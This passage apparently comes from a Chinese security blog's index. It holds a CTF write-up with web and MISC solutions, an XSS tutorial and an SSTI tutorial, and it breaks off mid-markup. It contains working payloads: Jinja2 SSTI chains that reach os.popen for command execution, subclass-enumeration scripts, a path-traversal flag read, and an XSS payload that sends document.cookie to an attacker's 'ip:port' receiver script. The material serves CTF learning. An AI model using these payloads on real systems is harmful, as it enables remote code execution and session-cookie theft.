class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">501</span>):</span><br><span class="line">    url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">    postPara = &#123;<span class="string">&quot;input&quot;</span>:<span class="string">&quot;&#123;&#123;\&quot;\&quot;.__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    res = requests.post(url=url,headers=headers,data=postPara)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text: <span class="comment">#查找其他命令时就用其他子类</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;be founded in:&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found&quot;</span>)</span><br><span class="line"><span class="comment"># 得到编号为137</span></span><br></pre></td></tr></table></figure><p>无过滤，直接拿 flag 即可</p><p>Payload:</p><p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('tac /flag').read()&#125;&#125;</code></p><h3 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h3><p>ssrf，伪协议读取 flag</p><p><code>file:///flag</code></p><p><img src="https://s2.loli.net/2024/06/05/uxGZVT7lds1n2z5.png" alt=""></p><h3 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件包含漏洞演示</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取并包含用户输入的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;..&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Access denied.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No file specified.&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>无过滤文件包含，路径穿越直接读取</p><p>payload:</p><p>post：<code>theme=../../../../../../flag</code></p><h3 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好康的&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;干巴爹干巴爹先辈~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开胃小菜))&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>abc 都可以采用数组绕过，payload：<code>?a[]=1&amp;b[]=2&amp;c[]=3</code></p><p>拿到并访问 dollar.php，发现需要绕过过滤构造出 12</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在 linux 的终端中，输入$(())可以构造出0，再进行取反$((~$(())))就可以构造出-1，其原理是对其二进制取反，00000000-&gt;0 取反则变成 11111111-&gt;-1</p><p>我们再将两个-1 合在一起并取反则是 ~(-2)-&gt;1</p><p>即$((~$(($((~$(())))$((~$(())))))))</p><p>由此我们可以构造出任意的数字，这里的 12 可以是对-13 取反为 12，</p><p>也可以是-2 取反和-3 取反之后合并为 12，这里我使用后者</p><p><strong>预期 payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x=$((~$(($(($((~$(())))$((~$(())))))))))$((~$(($((~$(())))$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure><blockquote><p>题目描述已经把预期 payload 字符全给了，其他姿势就请自行搜索了 0.0</p></blockquote><p>姬宝的好东西-&gt;<a href="https://github.com/ProbiusOfficial/bashFuck">https://github.com/ProbiusOfficial/bashFuck</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="涐贪恋和伱、甾―⑺de-毎兮毎秒"><a href="#涐贪恋和伱、甾―⑺de-毎兮毎秒" class="headerlink" title="涐贪恋和伱、甾―⑺dé 毎兮毎秒"></a>涐贪恋和伱、甾―⑺dé 毎兮毎秒</h3><p>lsb 隐写最低位</p><p><img src="https://s2.loli.net/2024/06/05/zkgOVWDn8GK5qvc.png" alt=""></p><h3 id="你说的对，但"><a href="#你说的对，但" class="headerlink" title="你说的对，但__"></a>你说的对，但__</h3><p>拿到附件 binwalk 分离出多张图片</p><p><img src="https://s2.loli.net/2024/06/05/kxKWbZJfSdOPva8.png" alt=""></p><p><img src="https://s2.loli.net/2024/06/05/mbrKwZNzSIxlD71.png" alt=""></p><p>拼好扫描得到 flag</p><h3 id="The-love"><a href="#The-love" class="headerlink" title="The love"></a>The love</h3><p>拿到一个图片和一个音频文件</p><p>图片 binwalk 分离出压缩包，文件名处得到 hint：Litctf??????ftclit</p><p><img src="https://s2.loli.net/2024/06/05/OUFMitcgBxTAyKL.png" alt=""></p><p>6 位纯数字密码爆破，带上头尾即可</p><p><img src="https://s2.loli.net/2024/06/05/gkV1ljPZXJvxmC7.png" alt=""></p><p>解压压缩包拿到假 flag 和一个 base64 加密的 password</p><p><img src="https://s2.loli.net/2024/06/05/wG1nxfOMsoANqk7.png" alt=""></p><p>deepsound 解密得到真 flag</p><p><img src="https://s2.loli.net/2024/06/05/Sh9ARPJHEflW3CU.png" alt=""></p><h3 id="舔到最后应有尽有"><a href="#舔到最后应有尽有" class="headerlink" title="舔到最后应有尽有"></a>舔到最后应有尽有</h3><p>base64 隐写，羊驼梭</p><p><img src="https://s2.loli.net/2024/06/05/I9uEWT1az5Nr3Dp.png" alt=""></p><h3 id="女装照流量"><a href="#女装照流量" class="headerlink" title="女装照流量"></a>女装照流量</h3><p>tcp.stream eq 28 拿到 flag.php 的加密压缩包</p><p><img src="https://s2.loli.net/2024/06/05/oIf4T8rSgwM7cel.png" alt=""></p><p>随后在 tcp.stream eq 26 处找到密码</p><p><img src="https://s2.loli.net/2024/06/05/ceqlJtHIYNPp23u.png" alt=""></p><p>最后两行删掉”参数名,&amp;,=”后 base64 解密</p><p><img src="https://s2.loli.net/2024/06/05/2s7RlABv8kp6EhS.png" alt=""></p><p>解压后得到 flag</p><h3 id="Every-Where-We-Go"><a href="#Every-Where-We-Go" class="headerlink" title="Every Where We Go"></a>Every Where We Go</h3><p>flag 直接放在了频谱图里，使用 Adobe 的 AU 或者 audacity 等查看频谱图即可</p><p><img src="https://s2.loli.net/2024/06/05/QEe9v2rGsCSaHc1.png" alt=""></p><h3 id="盯帧珍珠"><a href="#盯帧珍珠" class="headerlink" title="盯帧珍珠"></a>盯帧珍珠</h3><blockquote><p>古有盯裆猫咪，今有盯帧珍珠</p></blockquote><p>题目名及描述提示表明是 gif 图片并且要注意观察每一帧</p><p>也可以通过文件大小,文件头,file 命令等知道是 GIF 图片</p><p>先改后缀名为 GIF，后发现动画中有几帧的 flag 片段</p><p>使用 stegsolve,在线网站或脚本等逐帧提取对应 flag 片段图片，拼好 flag 即可</p><h3 id="原铁，启动！"><a href="#原铁，启动！" class="headerlink" title="原铁，启动！"></a>原铁，启动！</h3><blockquote><p>题目描述：这都是什么通用文字呢？</p></blockquote><p>题目名称得到信息:  原神崩铁</p><p>题目描述得到信息：通用字体</p><p>搜索引擎开搜即可</p><p><a href="https://draugus.github.io/genshin/language">https://draugus.github.io/genshin/language</a></p><p>提瓦特通用字体</p><p><a href="https://starrail.huijiwiki.com/wiki/%E6%96%87%E5%AD%97%E5%AF%B9%E7%85%A7%E8%A1%A8">https://starrail.huijiwiki.com/wiki/%E6%96%87%E5%AD%97%E5%AF%B9%E7%85%A7%E8%A1%A8</a></p><p>崩铁宇宙通用文</p><h3 id="关键，太关键了"><a href="#关键，太关键了" class="headerlink" title="关键，太关键了"></a>关键，太关键了</h3><blockquote><p>题目描述：好像某些字符出现的频率很高哦</p></blockquote><p>题目名称得到信息:  关键字加密</p><p>题目描述得到信息：字频统计</p><p>对 key.txt 的大量字符串进行字频统计得到 key:bingo</p><p>关键字解密 flag.txt 即可得到 flag</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/posts/XSS.html"/>
      <url>/posts/XSS.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>XSS的本质是一种高级钓鱼手法。</p><h2 id="认识XSS"><a href="#认识XSS" class="headerlink" title="认识XSS"></a>认识XSS</h2><p>XSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是为不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。</p></blockquote><p>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到提供给其它用户使用的页面中。</p><p>在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p><p>原理：将恶意的 script 脚本插入进 html/css/js 文件当中。<br><img src="https://s2.loli.net/2024/05/16/qZwLKH4DnGfRAxv.jpg" alt=""></p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS，又称非持久型XSS。<br>之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。<br>而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。</p><p>特点：<br>① 不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；<br>②攻击者需要诱骗点击；<br>③反馈率低，所以较难发现和响应修复；<br>④盗取用户敏感保密信息。</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS，又称持久型XSS。<br>他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。<br>一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，多见于论坛。黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。<br>特点：<br>①持久性，植入在数据库中；<br>②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；<br>③ 盗取用户敏感私密信息。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。对于img，input等这种类型的 DOM 节点标签，DOM型XSS就可以利用其进行攻击<br>DOM 型 XSS 全部都是由前端进行触发的。</p><h2 id="反射型XSS的利用"><a href="#反射型XSS的利用" class="headerlink" title="反射型XSS的利用"></a>反射型XSS的利用</h2><h3 id="例题：ctfshow-web入门-316"><a href="#例题：ctfshow-web入门-316" class="headerlink" title="例题：ctfshow web入门 316"></a>例题：ctfshow web入门 316</h3><p><img src="https://s2.loli.net/2024/05/16/6gCEYtPqxIbyzpm.png" alt=""><br>输入什么就返回什么，尝试执行js代码<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://s2.loli.net/2024/05/16/UwjXucIGtZBNbrv.png" alt=""><br>成功返回了弹窗</p><blockquote><p>本题的flag在管理员的cookie中，机器人会定时自动点击生成的链接</p></blockquote><p>创建一个自动接收脚本a.php在vps上<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>生成Xss代码链接,用于获取管理员cookie</p><p><code>&lt;script&gt;document.location.href=&#39;http://ip:port/a.php?cookie=&#39;+document.cookie&lt;/script&gt;</code></p><p>python3 -m http.server监听即可拿到cookie</p><p><img src="https://s2.loli.net/2024/05/16/tjV7pHcQsOndNZC.png" alt=""></p><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>参考：<br><a href="https://www.freebuf.com/articles/web/334662.html">从0到1完全掌握 XSS</a><br><a href="https://zhuanlan.zhihu.com/p/342603075">web攻防之XSS攻击详解——XSS简介与类型</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti</title>
      <link href="/posts/ssti%E6%B3%A8%E5%85%A5%5B5%5D.html"/>
      <url>/posts/ssti%E6%B3%A8%E5%85%A5%5B5%5D.html</url>
      
        <content type="html"><![CDATA[<h2 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h2><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文主要对ctf中的flask模板注入进行分析。</p><h2 id="常用python魔术方法："><a href="#常用python魔术方法：" class="headerlink" title="常用python魔术方法："></a>常用python魔术方法：</h2><blockquote><p><strong>class</strong> 返回类型所属的对象</p><p><strong>base</strong> 返回该对象所继承的基类<br><strong>mro</strong> 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><strong>bases</strong>  以元组形式返回类型对象的全部基类</p><p>//以上三种都是用于寻找基类</p><p><strong>subclasses</strong> 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</p><p><strong>init</strong> 类的初始化方法</p><p><strong>globals</strong> 对包含函数全局变量的字典的引用</p><p><strong>builtins</strong>  builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块</p></blockquote><h2 id="基础流程："><a href="#基础流程：" class="headerlink" title="基础流程："></a>基础流程：</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>变量-&gt;对象-&gt;基类-&gt;所有子类-&gt;通过 globals 来获取os,file等可以执行命令/读取文件的module<br><img src="https://s2.loli.net/2024/05/14/X1w2jU7O3raZb5d.png" alt=""></p><h3 id="判断注入点-变量"><a href="#判断注入点-变量" class="headerlink" title="判断注入点(变量)"></a>判断注入点(变量)</h3><p>假设为get参数name<br>?name=49 -&gt; 49 则表示注入成功</p><h3 id="带出对象"><a href="#带出对象" class="headerlink" title="带出对象"></a>带出对象</h3><p>选择以下任一格式，用class带出其对象(类)<br><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__</span>&#125;&#125;</span><span class="language-xml"> -&gt; <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">str</span>&#x27;&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;()<span class="name">.__class__</span>&#125;&#125;</span><span class="language-xml"> -&gt; <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">tuple</span>&#x27;&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__</span>&#125;&#125;</span><span class="language-xml"> -&gt; <span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">list</span>&#x27;&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;&#123;&#125;<span class="name">.__class__</span>&#125;&#125; <span class="name">-</span>&gt; &lt;class <span class="string">&#x27;dict&#x27;</span>&gt;</span></span><br><span class="line"><span class="template-variable">...</span></span><br></pre></td></tr></table></figure></p><blockquote><p>以下用’’作例子。</p></blockquote><h3 id="引出object-基类"><a href="#引出object-基类" class="headerlink" title="引出object(基类)"></a>引出object(基类)</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__mro__</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__mro__</span>[0]&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__bases__</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__bases__</span>[0]&#125;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="引出基类下的所有子类"><a href="#引出基类下的所有子类" class="headerlink" title="引出基类下的所有子类"></a>引出基类下的所有子类</h3><p>利用subclasses寻找可以利用的子类<br><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.subclasses__</span>()&#125;&#125;</span></span><br></pre></td></tr></table></figure><br>一般情况下会得到许多子类，这时可以通过手工，脚本或工具定位子类的位置</p><h3 id="遍历python环境中类的脚本："><a href="#遍历python环境中类的脚本：" class="headerlink" title="遍历python环境中类的脚本："></a>遍历python环境中类的脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get请求</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#http请求头，可以用抓包工具抓一份自己的。</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://xxx.xxx.xxx.xxx:xxxx/?get参数=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FileLoader&#x27;</span> <span class="keyword">in</span> res.text: <span class="comment">#以FileLoader为例</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到编号为79</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#post请求</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#http请求头，可以用抓包工具抓一份自己的。</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://xxx.xxx.xxx.xxx:xxxx/&quot;</span></span><br><span class="line">    postPara = &#123;<span class="string">&quot;post参数&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    res = requests.post(url=url,headers=headers,data=postPara)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FileLoader&#x27;</span> <span class="keyword">in</span> res.text: <span class="comment">#以FileLoader为例，查找其他命令时就用其他子类</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到编号为79</span></span><br></pre></td></tr></table></figure><h3 id="利用子类执行命令"><a href="#利用子类执行命令" class="headerlink" title="利用子类执行命令"></a>利用子类执行命令</h3><blockquote><p>可以用来执行命令的类有很多，其基本原理就是遍历含有eval函数即os模块的子类，利用这些子类中的eval函数即os模块执行命令。</p></blockquote><h4 id="eval函数执行命令"><a href="#eval函数执行命令" class="headerlink" title="eval函数执行命令"></a>eval函数执行命令</h4><blockquote><p>含有eval函数的类：<br>warnings.catch_warnings<br>WarningMessage<br>codecs.IncrementalEncoder<br>codecs.IncrementalDecoder<br>codecs.StreamReaderWriter<br>os._wrap_close<br>reprlib.Repr<br>weakref.finalize<br>…</p></blockquote><p>payload:<br><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[166].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></p><h4 id="popen函数执行命令"><a href="#popen函数执行命令" class="headerlink" title="popen函数执行命令"></a>popen函数执行命令</h4><blockquote><p>Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的。<br>我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。<br>所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。</p></blockquote><p>我们可以通过os模块的<strong>os._wrap_close</strong>类引出popen来执行命令<br><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[79].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><br>也可以直接使用popen来执行命令<br><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span 